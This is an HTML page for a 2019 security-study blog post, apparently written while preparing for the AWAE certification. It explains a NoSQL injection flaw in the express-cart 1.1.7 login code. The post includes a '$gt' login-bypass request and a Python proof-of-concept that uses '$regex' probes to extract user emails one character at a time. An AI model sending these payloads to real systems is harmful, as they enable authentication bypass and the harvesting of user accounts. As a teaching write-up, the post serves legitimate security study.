@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>Raind33rs blog</title>
+
+  <!-- Bootstrap core CSS -->
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Custom fonts for this template -->
+  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+  <!-- Custom styles for this template -->
+  <link href="css/clean-blog.min.css" rel="stylesheet">
+
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://twitter.com/raind33r_dc">Raind33r</a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="index.html">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="about.html">About</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="post.html">Start</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="contact.html">Contact</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('img/post-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+            <h1>AWAE Excercise 1</h1>
+            <h2 class="subheading">Problems look mighty small</h2>
+            <span class="meta">Posted by
+              <a href="#">anonymous reindeer</a>
+              on August 24, 2019</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>Ready for a warm up round?</p>
+
+          <p>What is wrong here, lets suppose it can be any code that looks like this, but a typical line in node.js: </br>
+db.accounts.find({username: username, password: password});</p>
+
+          <p>Take your time at each step to understand everything, you are, and you will be expected to do tons of independent research.</p>
+
+          <p>That being sad this is easy, yes it looks like some basic nosqli: </br>
+POST /login HTTP/1.1 </br>
+Host: example.org </br>
+Content-Type: application/json </br>
+Content-Length: 38
+{ </br>
+“username”: “admin”, </br>
+“Password”: {'$gt': “”} </br>
+}
+</p>
+
+          <p>Without further adue lets do the real warm up:</p>
+
+          <h2 class="section-heading">Install some npm package and dive in!</h2>
+
+          <p>npm install express-cart@1.1.7</p>
+
+          <p>Task: find a bug among the login functionalities of the package</p>
+
+          <blockquote class="blockquote">Please take your time to finish this task on your own, and then come back to check my solution.</blockquote>
+
+          <p>root@kali:~/Desktop/OFFSEC/OWASP2017/A1-INJECTION/NOSQL/node_modules/express-cart# grep login -rn .<br>
+<br>
+Among other results it seems that this part of code deals a lot with logging in:<br>
+<br>
+./routes/admin.js:26:// login form<br>
+./routes/admin.js:27:router.get('/admin/login', (req, res) => {<br>
+./routes/admin.js:36:        // we check for a user. If one exists, redirect to login form otherwise setup<br>
+./routes/admin.js:40:            res.render('login', {<br>
+./routes/admin.js:57:// login the user and check the password<br>
+./routes/admin.js:58:router.post('/admin/login_action', (req, res) => {<br>
+<br>
+Lets check admin.js and see what is responsible for loggin in, and of course try to find user input<br>
+<br>
+The first code block is a login form:<br>
+<br>
+<br>
+// login form<br>
+router.get('/admin/login', (req, res) => {<br>
+    let db = req.app.db;<br>
+<br>
+    db.users.count({}, (err, userCount) => {<br>
+        if(err){<br>
+            // if there are no users set the "needsSetup" session<br>
+            req.session.needsSetup = true;<br>
+            res.redirect('/admin/setup');<br>
+        }<br>
+        // we check for a user. If one exists, redirect to login form otherwise setup<br>
+        if(userCount > 0){<br>
+            // set needsSetup to false as a user exists<br>
+            req.session.needsSetup = false;<br>
+            res.render('login', {<br>
+                title: 'Login',<br>
+                referringUrl: req.header('Referer'),<br>
+                config: req.app.config,<br>
+                message: common.clearSessionValue(req.session, 'message'),<br>
+                messageType: common.clearSessionValue(req.session, 'messageType'),<br>
+                helpers: req.handlebars.helpers,<br>
+                showFooter: 'showFooter'<br>
+            });<br>
+        }else{<br>
+            // if there are no users set the "needsSetup" session<br>
+            req.session.needsSetup = true;<br>
+            res.redirect('/admin/setup');<br>
+        }<br>
+    });<br>
+});<br>
+<br>
+This code handles a get request to /admin/login page but it seems there is no username or password just some app logic for handling the first time the user lands on the page, it checks if there are users or it has to be set up, etc.<br>
+<br>
+<br>
+The next code block handles a post request and there is a password check too, mmm sounds interesting<br>
+<br>
+// login the user and check the password<br>
+router.post('/admin/login_action', (req, res) => {<br>
+    let db = req.app.db;<br>
+<br>
+    db.users.findOne({userEmail: req.body.email}, (err, user) => {<br>
+        if(err){<br>
+            res.status(400).json({message: 'A user with that email does not exist.'});<br>
+            return;<br>
+        }<br>
+<br>
+        // check if user exists with that email<br>
+        if(user === undefined || user === null){<br>
+            res.status(400).json({message: 'A user with that email does not exist.'});<br>
+        }else{<br>
+            // we have a user under that email so we compare the password<br>
+            bcrypt.compare(req.body.password, user.userPassword)<br>
+            .then((result) => {<br>
+                if(result){<br>
+                    req.session.user = req.body.email;<br>
+                    req.session.usersName = user.usersName;<br>
+                    req.session.userId = user._id.toString();<br>
+                    req.session.isAdmin = user.isAdmin;<br>
+                    res.status(200).json({message: 'Login successful'});<br>
+                }else{<br>
+                    // password is not correct<br>
+                    res.status(400).json({message: 'Access denied. Check password and try again.'});<br>
+                }<br>
+            });<br>
+        }<br>
+    });<br>
+});<br>
+<br>
+Right at the beggining of the code we see that the email from request body, which is a post parameter, is not sanitized at all. The query looks like and turns out to be a classical nosql query, which is vulnerable to nosqli.<br>
+<br>
+There are two simple ways to extract direct information from nosqli with $regex and with $in:<br>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#extract-data-information">NoSQLi payloads</a><br>
+<br>
+Findings this vuln and knowing how to exploit it is enough for the excercise, but lets check and analyze the poc from the official report on hackerone:<br>
+<a href="https://hackerone.com/reports/397445">report link</a><br>
+<br>
+import requests<br>
+import string<br>
+<br>
+charset = string.lowercase + string.digits + '@.'<br>
+<br>
+def test_email(email):<br>
+    email = email.replace('.', '\\.')<br>
+    content = requests.post('http://localhost:1111/customer/login_action', json={'loginEmail': {'$regex': '^' + email}, 'password': 'asdf'}).content<br>
+<br>
+    return 'Access denied' in content<br>
+<br>
+<br>
+def get(prefix=''):<br>
+    # check if a prefix is a full email in the database<br>
+    if test_email(prefix + "$"):<br>
+        print prefix<br>
+        return<br>
+<br>
+    for c in charset:<br>
+        if test_email(prefix + c):<br>
+<br>
+            get(prefix + c)<br>
+<br>
+get()<br>
+<br>
+The solution poc is really simple it uses the metioned regex technique to check the characters one by one if they exist in that order in the emails $regex<br>
+It is basically the same as some of the blind sql injections: select ascii(substring(user,1,1))<br>
+<br>
+The email test function sends a post request and apparently if access denied is present in response, then the email exists<br>
+db.users.findOne({userEmail: req.body.email} becomes db.users.findOne({userEmail: {'$regex': '^' + email}<br>
+which reveals the correct email<br>
+As I write this line I just saw that the requests do not have the same parameter in my research and in the poc, could it be that the other vuln is the same but was not found? Yeah probably not, which was checked after a quick google: <a href="https://github.com/mrvautin/expressCart/commit/b2234ef4f28225bb42f74bf6cf33759048aba518">link</a><br>
+<br>
+So lets comment the get function, its recursively implemented to append a character to the email for testing and the charset are all usual email chars:<br>
+charset = string.lowercase + string.digits + '@.'<br>
+<br>
+When the email is tested and it returns a valid response with an ending character $, it means that the email is found.<br></p>
+
+          <h2 class="section-heading">Takeaways and extra miles</h2>
+
+          <p>Notice how easy was to find a vuln in a large code chunk. A good idea would be to search for NoSQLi vulns now among some well known libraries and apps if your main focus is AWAE. Maybe <a href="https://www.exploit-db.com/exploits/24947">this</a> looks like an interesting research topic or <a href="https://blog.rapid7.com/2016/07/28/pentesting-in-the-real-world-going-bananas-with-mongodb/">this.</a> Eventually, the point is to take any application or exploit and to understand the code and the root cause behind it.</p>
+
+          <a href="#">
+            <img class="img-fluid" src="img/raindeer.png" alt="">
+          </a>
+          <span class="caption text-muted">To go places and do things that have never been done before – that’s what living is all about.</span>
+      </div>
+    </div>
+  </article>
+
+  <hr>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            <li class="list-inline-item">
+              <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            <li class="list-inline-item">
+              <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            <li class="list-inline-item">
+              <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy; Damjan Cvetanović - raind33r 2019</p>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Custom scripts for this template -->
+  <script src="js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
